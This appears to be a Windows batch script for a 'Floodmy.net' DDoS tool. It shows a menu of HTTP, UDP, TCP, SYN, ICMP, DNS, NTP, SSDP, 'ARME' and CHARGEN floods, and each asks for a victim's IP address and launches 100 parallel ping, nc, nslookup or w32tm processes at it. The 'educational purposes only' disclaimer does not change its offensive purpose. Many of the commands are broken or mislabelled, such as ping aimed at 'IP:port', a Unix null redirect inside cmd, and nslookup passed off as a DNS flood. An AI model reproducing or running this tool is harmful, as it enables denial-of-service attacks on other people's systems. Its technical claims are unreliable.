@echo off
title Floodmy.net - DDoS Interface - CheatMyWay
setlocal enabledelayedexpansion
echo Floodmy.net - Terms of Use
echo ======================
echo.
echo By using this software, you agree to the following terms:
echo.
echo 1. This software is made for educational purposes only.
echo 2. The author is not responsible for any misuse or damage caused by this software.
echo 3. If the user causes ANY kinds of damages with this software, the user alone
echo is responsible for actions taken by the user.
echo If you don't agree with these terms, close this software.
pause
goto menu
:menu
cls
echo.
echo Floodmy.net - DDoS Interface
echo ==========================
echo.
echo 1. HTTP Flood
echo 2. UDP Flood
echo 3. TCP Flood
echo 4. SYN Flood
echo 5. ICMP Flood
echo 6. DNS Flood
echo 7. NTP Flood
echo 8. SSDP Flood
echo 9. ARME Flood
echo 10. CHARGEN Flood
echo 11. Term of use
echo.
echo 0. Exit
echo.
set /p menuInput="Select an option: "

if "%menuInput%" == "1" goto httpflood
if "%menuInput%" == "2" goto udpflood
if "%menuInput%" == "3" goto tcpflood
if "%menuInput%" == "4" goto synflood
if "%menuInput%" == "5" goto icmpflood
if "%menuInput%" == "6" goto dnsflood
if "%menuInput%" == "7" goto ntpflood
if "%menuInput%" == "8" goto ssdpflood
if "%menuInput%" == "9" goto armeflood
if "%menuInput%" == "10" goto chargenflood
if "%menuInput%" == "11" goto terms
if "%menuInput%" == "0" goto exit
cls
echo Error: No correct input
pause
goto menu

:httpflood
set /p victimIP="Enter victim's IP address: "
echo Performing HTTP Flood...
set port=80
set threads=100
set timeout=1000
for /L %%x in (1,1,!threads!) do start /b cmd /c "ping.exe -n !timeout! %victimIP% & echo. & ping.exe -n !timeout! %victimIP%:%%x & echo."
goto menu

:udpflood
set /p victimIP="Enter victim's IP address: "
echo Performing UDP Flood...
set port=80
set threads=100
set timeout=1000
for /L %%x in (1,1,!threads!) do start /b cmd /c "ping.exe -n !timeout! -l 65500 %victimIP%"
goto menu

:tcpflood
set /p victimIP="Enter victim's IP address: "
echo Performing TCP Flood...
set port=80
set threads=100
set timeout=1000
for /L %%x in (1,1,!threads!) do start /b cmd /c "nc -w !timeout! %victimIP% !port! </dev/null"
goto menu

:synflood
set /p victimIP="Enter victim's IP address: "
echo Performing SYN Flood...
set port=80
set threads=100
set timeout=1000
for /L %%x in (1,1,!threads!) do start /b cmd /c "nc -w !timeout! %victimIP% !port! -z"
goto menu

:icmpflood
set /p victimIP="Enter victim's IP address: "
echo Performing ICMP Flood...
set threads=100
set timeout=1000
for /L %%x in (1,1,!threads!) do start /b cmd /c "ping.exe -n !timeout! %victimIP%"
goto menu

:dnsflood
set /p victimIP="Enter victim's IP address: "
echo Performing DNS Flood...
set threadsc=100
set timeout=1000
for /L %%x in (1,1,!threadsc!) do start /b cmd /c "nslookup %victimIP% & nslookup %victimIP% & nslookup %victimIP%"
goto menu

:ntpflood
set /p victimIP="Enter victim's IP address: "
echo Performing NTP Flood...
set threads=100
set timeout=1000
for /L %%x in (1,1,!threads!) do start /b cmd /c "w32tm /stripchart /computer:%victimIP% /dataonly /samples:10000000000"
goto menu

:ssdpflood
set /p victimIP="Enter victim's IP address: "
echo Performing SSDP Flood...
set threads=100
set timeout=1000
for /L %%x in (1,1,!threads!) do start /b cmd /c "ssdpscan.exe -t !timeout! -v -p %victimIP%"
goto menu

:armeflood
set /p victimIP="Enter victim's IP address: "
echo Performing ARME Flood...
set threads=100
set timeout=1000
for /L %%x in (1,1,!threads!) do start /b cmd /c "arme -t !timeout! %victimIP%"
goto menu

:chargenflood
set /p victimIP="Enter victim's IP address: "
echo Performing CHARGEN Flood...
set threads=100
set timeout=1000
for /L %%x in (1,1,!threads!) do start /b cmd /c "nc -u -n -w !timeout! %victimIP% 19 & nc -u -n -w !timeout! %victimIP% 19"
goto menu

:terms
cls
echo.
echo Floodmy.net - Terms of Use
echo ======================
echo.
echo By using this software, you agree to the following terms:
echo.
echo 1. This software is made for educational purposes only.
echo 2. The author is not responsible for any misuse or damage caused by this software.
echo 3. If the user causes ANY kinds of damages with this software, the user alone
echo is responsible for actions taken by the user.
pause
goto menu
cls
:exit
echo Exiting Floodmy.net...
exit